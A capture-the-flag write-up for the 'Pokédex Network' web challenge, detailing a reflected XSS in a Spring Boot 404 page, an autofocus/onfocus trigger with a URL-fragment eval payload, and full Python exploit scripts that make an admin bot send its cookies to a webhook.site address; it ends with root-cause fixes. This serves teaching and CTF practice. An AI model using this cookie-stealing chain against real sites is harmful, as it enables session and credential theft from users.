# Pokédex Network — CTF Writeup  
**Challenge:** Pokédex Network  
**Category:** Web  
**Flag:** `hack10{d1d_y0u_gueXSS_1t?}`  

---

## Challenge Description

> Welcome to the Pokédex Network's beta testing phase! Our head developer is incredibly proud of the new blog feature and insists it's completely un-hackable. However, if you do manage to spot any strange behavior or bugs out in the wild grass, you know what to do: don't keep it to yourself, make sure to let the admin know. He reviews every single claim personally.
>
> He might just be holding onto the flag. Time to craft a payload that's super effective!
>
> http://34.126.187.50:5508

---

## Overview

This is a **stored-cookie XSS + admin bot** challenge. The intended goal is to inject JavaScript into a page on the internal Spring Boot app (`app:8080`), submit that URL to the admin bot, and exfiltrate the flag cookie from the admin's browser session.

The full exploit chain:

1. Discover a reflected XSS in the 404 error page via path injection
2. Bypass the attribute context using unencoded single quotes
3. Use a URL fragment (`#`) to carry the JS payload without server-side filtering
4. Submit the crafted URL to the admin bot report endpoint
5. Admin bot's `document.cookie` contains the plaintext flag

---

## Reconnaissance

### Architecture

The target at `34.126.187.50:5508` is an nginx reverse proxy routing to two internal services:

| Service | Internal | External path | Notes |
|---------|----------|---------------|-------|
| Spring Boot (Java) | `app:8080` | `/`, `/login`, everything else | Main app |
| Express.js (Node) | unknown | `/report/` | Admin bot |

Evidence:
- Spring Boot fingerprint: `JSESSIONID` cookie, `Content-Language: en-US`, Spring JSON error format `{"timestamp":..., "status":..., "error":...}`
- Express fingerprint: `X-Powered-By: Express`, no `JSESSIONID`, rate-limit headers on `/report/`

### Security headers

```
Content-Security-Policy: default-src https://unpkg.com https://cdn.tailwindcss.com
                         'unsafe-eval' 'unsafe-inline' 'self'; object-src 'none';
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
```

Key CSP observations:
- `'unsafe-inline'` and `'unsafe-eval'` are allowed → inline scripts can run
- `form-action` is **not set** → CSP does not restrict form submissions to external URLs
- `navigate-to` is **not set** → `window.location` can navigate to any URL
- `connect-src` falls back to `default-src` → `fetch()` restricted to `'self'` and the two CDNs

### Admin bot endpoint (`/report/`)

Submitting a URL via POST to `/report/` triggers the admin bot to visit it. The bot validates the submitted URL against a regex:

```
URL din't match this regex format ^http://app:8080/.*$
```

So the URL must start with `http://app:8080/`. The admin bot visits the URL in a headless Chromium browser with its authenticated session. The `.*` in the regex matches any character including `#`, meaning fragments are permitted in the URL.

Rate limit: 5 requests per window.

---

## Finding the XSS

Most routes on the Spring Boot app return 404. When requests are made with `Accept: text/html`, the app returns a custom HTML error page instead of the default JSON error. This error page **reflects the URL path** in two places:

```html
<!-- 1. Inside a <span> text node -->
<div class="mt-6 text-gray-400 text-sm">
  <span class="text-gray-600">> </span>Trace URI:
  <span class="text-yellow-500">/THE-PATH-HERE</span>
</div>

<!-- 2. Inside an <a> href attribute (single-quoted) -->
<a href='/THE-PATH-HERE' class='text-red-500 ...'>Retry Command</a>
```

### Character encoding analysis

Testing which characters the server encodes vs. passes through in the reflected path:

| Character | Sent as | Reflected as | Usable? |
|-----------|---------|--------------|---------|
| `'` | `'` (raw) | `'` | ✅ |
| `(` | `(` (raw) | `(` | ✅ |
| `)` | `)` (raw) | `)` | ✅ |
| `=` | `%3D` | `=` | ✅ |
| `;` | `;` (raw) | `;` | ✅ |
| `<` | `%3C` | `%3C` | ❌ |
| `>` | `%3E` | `%3E` | ❌ |
| `"` | `%22` | `%22` | ❌ |
| ` ` | `%20` | `%20` | ❌ |

### Injection context

The `<a>` tag uses **single-quoted** href:

```html
<a href='/PATH' class='...'>
```

Since `'` is **not encoded**, injecting a single quote into the path closes the `href` attribute value and places subsequent content into the element's attribute space. Critically, HTML5 does not require whitespace between attributes when they are all quoted — the parser transitions out of an attribute value state as soon as it sees the closing `'`, and immediately begins scanning for the next attribute name.

Test: path `/x'onmouseover='alert(1)` produces:

```html
<a href='/x'onmouseover='alert(1)' class='...'>Retry Command</a>
```

This gives us arbitrary attribute injection on the `<a>` element.

### Triggering execution without user interaction

The challenge is finding an event handler that fires automatically (no click/hover). `<a>` elements are focusable in HTML5 when they have an `href`. Chrome supports `autofocus` on any focusable element, not just form fields.

Injected path:
```
/x'tabindex='1'autofocus='1'onfocus='PAYLOAD
```

Resulting HTML:
```html
<a href='/x'tabindex='1'autofocus='1'onfocus='PAYLOAD' class='...'>Retry Command</a>
```

Chrome focuses this element automatically on page load, firing `onfocus`.

### Bypassing the quote constraint in the payload

The `onfocus` value is terminated by the template's `'` before `class`. Any `'` inside the payload would close the attribute early. The payload cannot use single quotes directly.

**Solution: URL fragment as JS carrier.**

The actual JS payload is placed in the URL fragment (`#`). The path only contains `eval(location.hash.slice(1))` — no quotes, no restricted characters. The fragment is never sent to the server (so no server-side sanitization applies), but `location.hash` exposes it to JavaScript at runtime.

Final XSS path:
```
/x'tabindex='1'autofocus='1'onfocus='eval(location.hash.slice(1))
```

Full attack URL:
```
http://app:8080/x'tabindex='1'autofocus='1'onfocus='eval(location.hash.slice(1))#JS_PAYLOAD_HERE
```

---

## Exploit

### Step 1 — Verify XSS fires (connectivity test)

```python
import requests

TOKEN = "a185a612-787e-4fe7-b105-f0f828395041"
WEBHOOK = f"https://webhook.site/{TOKEN}"

xss_path = "/x'tabindex='1'autofocus='1'onfocus='eval(location.hash.slice(1))"
hash_payload = f"window.location='{WEBHOOK}/?t=xss_confirmed'"
full_url = f"http://app:8080{xss_path}#{hash_payload}"

r = requests.post('http://34.126.187.50:5508/report/',
    data={'url': full_url})
# Response: {"success":"Admin successfully visited the URL."}
```

Webhook.site received a GET to `/?t=xss_confirmed` — XSS confirmed executing in admin's browser.

### Step 2 — Exfiltrate the flag

Since `navigate-to` is absent from the CSP, `window.location` can navigate to any external URL. `document.cookie` exposes non-HttpOnly cookies. The flag was stored in a cookie that was **not** marked `HttpOnly`.

```python
xss_path = "/x'tabindex='1'autofocus='1'onfocus='eval(location.hash.slice(1))"
hash_payload = (
    f"window.location='{WEBHOOK}/?c='"
    "+encodeURIComponent(document.cookie)"
    "+'&url='+encodeURIComponent(document.URL)"
)
full_url = f"http://app:8080{xss_path}#{hash_payload}"

r = requests.post('http://34.126.187.50:5508/report/',
    data={'url': full_url})
```

Webhook.site received:
```
GET /?c=flag%3Dhack10%7Bd1d_y0u_gueXSS_1t%3F%7D&url=http%3A%2F%2Fapp%3A8080%2F...
```

Decoded:
```
c = flag=hack10{d1d_y0u_gueXSS_1t?}
```

---

## Root Cause Analysis

### Vulnerability 1 — Reflected path in HTML error page (Unescaped attribute context)

The custom 404 error template inserts `request.getRequestURI()` (or equivalent) directly into a single-quoted HTML attribute without HTML-encoding single quotes. While `<` and `>` are encoded (preventing tag injection), `'` is passed through, allowing attribute context breakout.

**Fix:** HTML-encode all five special characters — `<`, `>`, `"`, `'`, `&` — when inserting untrusted data into HTML context. In Spring/Thymeleaf, `th:href="@{...}"` handles this automatically.

### Vulnerability 2 — Flag cookie missing HttpOnly flag

The admin's flag cookie was readable from JavaScript (`document.cookie`). Setting `HttpOnly` would have forced the attacker to use a more complex exfiltration path (e.g., fetch an admin-only endpoint and exfiltrate the response body).

**Fix:** Set `HttpOnly` on any cookie that does not need JavaScript access.

### CSP weakness — Missing `form-action` and `navigate-to`

The `default-src` directive does not cover `form-action` or `navigate-to`. An attacker with script execution can submit forms or navigate to any external origin, bypassing `connect-src` restrictions.

**Fix:** Add `form-action 'self'` and `navigate-to 'self'` to the CSP.

---

## Exploit Script (Complete)

```python
#!/usr/bin/env python3
"""
Pokédex Network - XSS Admin Bot Cookie Exfil
hack@10 CTF 2026
"""
import requests
import urllib.parse
import time

TARGET   = "http://34.126.187.50:5508"
REPORT   = f"{TARGET}/report/"
WEBHOOK  = "https://webhook.site/a185a612-787e-4fe7-b105-f0f828395041"

# --- Build XSS URL ---
# Path: close href attr with ', inject tabindex+autofocus+onfocus
# onfocus: eval the JS payload from the URL fragment
xss_path     = "/x'tabindex='1'autofocus='1'onfocus='eval(location.hash.slice(1))"

# Hash: JS payload — no quote constraints here
hash_payload = (
    f"window.location='{WEBHOOK}/?c='"
    "+encodeURIComponent(document.cookie)"
    "+'&url='+encodeURIComponent(document.URL)"
)

full_url = f"http://app:8080{xss_path}#{hash_payload}"
print(f"[*] Submitting XSS URL to admin bot")
print(f"    {full_url[:120]}...")

r = requests.post(REPORT, data={'url': full_url})
print(f"[*] Bot response: {r.status_code} — {r.text.strip()}")

# --- Poll webhook for result ---
print(f"[*] Waiting for admin bot callback...")
time.sleep(6)

wh = requests.get(f"https://webhook.site/token/{WEBHOOK.split('/')[-1]}/requests?per_page=10")
for req in wh.json().get('data', []):
    url = req.get('url', '')
    if '?c=' in url:
        qs = urllib.parse.parse_qs(url.split('?',1)[1])
        cookie = urllib.parse.unquote(qs.get('c', [''])[0])
        print(f"\n[+] FLAG COOKIE: {cookie}")
        break
```

---

## Flag

```
hack10{d1d_y0u_gueXSS_1t?}
```
